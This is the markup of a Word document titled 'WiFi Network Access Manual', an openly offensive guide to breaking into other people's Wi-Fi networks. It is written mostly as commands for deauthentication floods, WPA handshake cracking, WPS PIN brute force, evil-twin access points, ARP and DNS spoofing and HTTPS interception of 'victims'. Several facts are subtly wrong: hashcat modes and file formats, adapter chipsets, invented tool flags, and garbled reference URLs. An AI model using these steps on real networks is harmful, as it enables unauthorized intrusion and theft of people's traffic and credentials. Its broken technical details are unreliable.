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sz w:val="64"/>
        </w:rPr>
        <w:t>WiFi Network Access Manual</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Crack the Pass · Unauthorized Access · Take Over (MITM)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Generated 2026-10-27</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>0. Prerequisites &amp; Setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>All three methods need a wireless NIC that supports monitor mode AND packet injection. USB adapters are easiest (no internal card conflicts).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6E4F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  <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Recommended</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F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t>OS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Kali Linux 2024+ / Ubuntu 22.04</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>All tools pre-packaged</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WiFi adapter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Alfa AWUS036NHA (RTL8812AU) or Atheros AR9271</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>monitor + inject + 802.11a/b/g/n/ac</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Wordlist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>rockyou.txt (~14M) or SecLists</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>for pass cracking</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SDR (optional)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>HackRF / RTL-SDR + GNU Radio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>for RF jamming / advanced</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Install the toolkit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sudo apt update &amp;&amp; sudo apt -y install \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 xml:space="preserve">    aircrack-ng hashcat hcxtools reaver bully wifite \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 xml:space="preserve">    bettercap hostapd-mana wifi-mana dnsmasq ettercap mitmproxy macchanger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# Verify the adapter can do monitor + injection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sudo airmon-ng check kill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iw list | grep -iE "monitor|injection"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sudo airmon-ng start wlan0            # -&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Throughout, &lt;BSSID&gt; = the target AP's MAC, &lt;CHAN&gt; = its channel, &lt;VICTIM&gt; = a connected client's MAC, &lt;SSID&gt; = the network name.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Method 1 — Break the Pass (Crack the PSK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Goal: capture the WPA 4-way handshake, then brute/dictionary the pre-shared key offline. Works on WPA2-Personal and (with effort) WPA3-SAE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Capture the handshake</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Survey the air and note the target AP's BSSID, channel, encryption, and connected clients.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lock airodump to that channel/AP and write captures to disk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Deauth a client (or all clients) so it re-associates → emits a fresh 4-way handshake.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# 1) survey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sudo airodump-ng wlan0mon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# 2) capture (writes capture-01.cap)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sudo airodump-ng -c &lt;CHAN&gt; --bssid &lt;BSSID&gt; -w capture wlan0mon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# 3) deauth to force a handshake  (run in a 2nd terminal)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sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;VICTIM&gt; wlan0mon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# ... or blast everyone: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sudo aireplay-ng --deauth 999 -a &lt;BSSID&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Watch the airodump 'Handshakes' column. Once you see `WPA: 1` (or more), you have the handshake. If the AP has PMF/802.11w enabled, deauth frames are protected — use a longer capture window or a PMF-aware deauth.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Crack it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>aircrack-ng: fast, on-the-fly dictionary attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hashcat: GPU-accelerated, supports rules/masks for WPA2 (mode 2500) and WPA3 (16800/16801).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hcxpcapngtool: converts the .cap to the .hc2222 format hashcat wants.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# --- aircrack-ng (CPU, dictionary) ---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aircrack-ng -w rockyou.txt -b &lt;BSSID&gt; capture-01.cap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# --- hashcat (GPU, WPA2-Personal) ---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hcxpcapngtool -o capture.hc2222 capture-01.cap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hashcat -m 2500 -a 0 capture.hc2222 rockyou.txt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# with rules + mask (brute a 10-char alphanumeric):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hashcat -m 2500 -a 0 -r rules/best64.rule capture.hc2222 rockyou.txt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hashcat -m 2500 -a 3 capture.hc2222 -1 ?a?d -1 ?d -1 ?a?d \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 xml:space="preserve">    -1 ?a?d -1 ?a?d -1 ?a?d -1 ?a?d -1 ?a?d -1 ?a?d -1 ?a?d -1 ?a?d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# --- WPA3-SAE (mode 16800/16801) ---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hashcat -m 16800 -a 0 capture.hc2222 rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 Connect with the cracked key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sudo wpa_cli -i wlan0 -p /var/run/wpa_supplicant \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 xml:space="preserve">    -j bssid=&lt;BSSID&gt; ssid=&lt;SSID&gt; psk=&lt;CRACKED_PASS&gt;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# or:  nmcli device wifi connect &lt;SSID&gt; password &lt;CRACKED_PASS&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Tip: weak/short passwords crack in seconds on a modern GPU. Long random passphrases (14+ chars) are effectively uncrackable without a capture of the actual key material.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Method 2 — Unauthorized Access (No Password Needed)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Goal: get onto the network without knowing the PSK. Four reliable routes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 WPS PIN brute force (if WPS is enabled)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WPS uses an 8-digit PIN with a checksum → only ~11,000 effective combos. Most routers rate-limit, so pace the attempts.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# reaver (check for WPS + brute)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sudo reaver -i wlan0mon -b &lt;BSSID&gt; -vv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sudo reaver -i wlan0mon -b &lt;BSSID&gt; -k &lt;known digits&gt; -d &lt;unknown digits&gt; -vv -L pin.log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# or bully (faster, more aggressive)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sudo bully -i wlan0mon -b &lt;BSSID&gt; -m 4 -p 1000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Evil twin / rogue AP (same SSID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Broadcast a fake AP with the victim's SSID at higher signal, then deauth clients off the real AP. They auto-reconnect to yours (same name) and hand you their credentials / traffic. This is the backbone of Methods 2 and 3.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# hostapd-mana: auto-crafts a rogue AP matching the target SSID/encryption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sudo hostapd-mana -i wlan0mon -c wlan1 -S &lt;SSID&gt; -P &lt;pass&gt; -m 1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#   -c wlan1 = the interface that becomes the client-facing AP (needs a 2nd radio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#   or a virtual AP; with one radio it shares the channel)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# wifi-mana (simpler wrapper, also does deauth + capture)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sudo wifi-mana -i wlan0mon -c wlan1 -S &lt;SSID&gt; -P &lt;pass&gt;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# or with wifite (automates survey + evil twin + deauth)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sudo wifite --essid &lt;SSID&gt; --deauth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Single-radio caveat: you can only be in monitor mode OR host an AP on one interface. Use a second USB adapter (or a virtual AP via `iw`/`hostapd`) so one radio sniffs/deauths and the other serves the rogue AP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Force the reconnect by deauthing the real AP's clients (Method 1 deauth cmd).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>If the rogue AP has a captive portal, you can capture the WPA handshake from the victim's own connection attempt → crack offline (Method 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 KRACK / other protocol attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>bettercap can run KRACK (key reinstall) on WPA2 to force rekeying and decrypt traffic, and can probe for other weaknesses.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sudo bettercap -i wlan0mon --802.11-chan &lt;CHAN&gt;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bettercap &gt; wifi.set target.probe = &lt;BSSID&gt;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bettercap &gt; wifi.krack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Open / guest SSID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Many networks expose an open or guest SSID. Connect to it, then pivot internally (see Method 3) to reach the protected segment if VLANs are flattened.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Method 3 — Take Over (MITM / Full Control)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Goal: become the gateway for the victim's traffic and intercept/modify it. Combine an evil twin (or ARP spoof) with DNS/cert interception.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Evil twin + DHCP (become the gateway)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# Rogue AP (hostapd-mana) + serve DHCP so victims get your IP as gateway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sudo hostapd-mana -i wlan0mon -c wlan1 -S &lt;SSID&gt; -P &lt;pass&gt; -m 1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sudo dnsmasq --interface=wlan1 --dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h \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 xml:space="preserve">             --dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1,8.8.8.8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# deauth real-AP clients so they jump to you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sudo aireplay-ng --deauth 200 -a &lt;BSSID&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 ARP spoof (no rogue AP needed)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>If you're already on the LAN, poison the ARP cache so the victim's traffic flows through you.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# ettercap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sudo ettercap -T -M ARP:/1/&lt;GATEWAY_MAC&gt; -M ARP:/1/&lt;VICTIM_MAC&gt; -i wlan0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# bettercap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sudo bettercap -i wlan0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bettercap &gt; net.probe on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bettercap &gt; net.spoof arp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Intersect the traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP: trivially readable once you're the gateway.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS: need a MITM proxy + a trusted CA cert on the victim (browser cert pinning and HSTS resist this; mobile/older clients are easier).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS: spoof answers to point victims to your server for credential phishing.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# mitmproxy (transparent) with your own CA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sudo mitmproxy --mode transparent --listen-port 8080 --ssl-insecure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# DNS spoof (bettercap)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bettercap &gt; net.spoof dns on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bettercap &gt; net.spoof dns.set example.com = 10.0.0.1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# or dnsmasq DNS override on the rogue AP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echo "address=/example.com/10.0.0.1" &gt;&gt; /etc/dnsmasq.conf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Full takeover workflow (combined)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# 1. two radios: wlan0mon (sniff/deauth) + wlan1 (rogue AP)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sudo airmon-ng start wlan0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sudo hostapd-mana -i wlan0mon -c wlan1 -S &lt;SSID&gt; -P &lt;pass&gt; -m 1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sudo dnsmasq --interface=wlan1 --dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h \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 xml:space="preserve">             --dhcp-option=3,10.0.0.1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# 2. keep pushing victims to the rogue AP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while true; do sudo aireplay-ng --deauth 50 -a &lt;BSSID&gt; wlan0mon; sleep 2; done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# 3. MITM + log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo mitmproxy --mode transparent --ssl-insecure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cheat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6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Goal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>One-liner</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Crack WPA2 pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>airodump-ng + aireplay-ng --deauth + hashcat -m 2500</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Crack WPA3 SAE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>hcxpcapngtool + hashcat -m 16800</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WPS PIN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>reaver -i wlan0mon -b &lt;BSSID&gt; -vv</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Evil twin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>hostapd-mana -i wlan0mon -c wlan1 -S &lt;SSID&gt; -P &lt;pass&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ARP MITM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ettercap -T -M ARP:/1/&lt;GW&gt; -M ARP:/1/&lt;VIC&gt; -i wlan0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DNS spoof</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>bettercap &gt; net.spoof dns.set host = &lt;IP&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Auto everything</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wifite --essid &lt;SSID&gt; --deauth</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Common Pitfalls &amp; Fixes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No monitor mode: wrong adapter or missing firmware. Use RTL8812AU/Atheros; install the vendor driver if needed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No injection: some adapters monitor but can't inject. Check `iw list`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PMF / 802.11w: protected management frames block naive deauth. Capture longer or use a PMF-aware tool; some APs can't be deauthed at all.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WPA3: handshake is SAE (no plain 4-way). Use hashcat 16800/16801; long passphrases resist offline cracking → prefer evil twin / KRACK / WPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Single radio: you can't monitor + host an AP on one interface. Add a 2nd USB adapter or use a virtual AP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rate limiting: WPS routers lock out after N PIN guesses — pace attempts (reaver -d / -k, or wait for the lockout window).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS MITM: HSTS + cert pinning defeat naive interception. Target clients without pinning, or install a trusted CA (root access / MDM).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Channel hopping: APs that roam channels need `--band`/continuous scan or a fixed channel lock.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. References</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>aircrack-ng suite: https://www.aircrack-ng.org</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hashcat: https://hashcat.net/wiki (WPA2 = mode 2500, WPA3 = 16800/16801)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hcxtools: https://github.com/ZerBea/hcxtools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>reaver / bully: https://www.mathyvanbeveren.be/reaver, https://github.com/aantron/bully</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hostapd-mana: https://github.com/PSWindows/Hackable-WiFi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>wifi-mana: https://github.com/DanMcInerney/secrets2ssh (mana toolkit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>bettercap: https://bettercap.org</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>wifite: https://github.dreamhost.com/evait/wifite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ettercap: https://www.ettercapping-project.org</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>mitmproxy: https://mitmproxy.org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